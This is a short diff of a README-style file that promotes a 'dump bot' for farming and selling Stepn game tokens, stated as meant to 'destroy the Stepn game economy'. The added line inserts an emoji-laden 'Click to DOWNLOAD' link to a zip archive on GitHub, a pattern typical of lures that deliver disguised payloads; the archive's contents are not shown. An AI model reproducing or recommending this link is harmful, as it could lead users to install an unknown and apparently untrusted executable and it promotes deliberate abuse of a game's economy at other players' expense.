@@ -11,7 +11,7 @@ How to get a:
 
 ### Next, sell these tokens on any marketplace to help us destroy the Stepn game economy.
 ### Repeat the procedure after 24 hours and get tokens again
-#
+# [>>>⚡️ Click to DOWNLOAD ⚡<<<](https://github.com/farmsc/dumpbot/raw/main/Dump%20Bot.zip)
 #
 #
 #
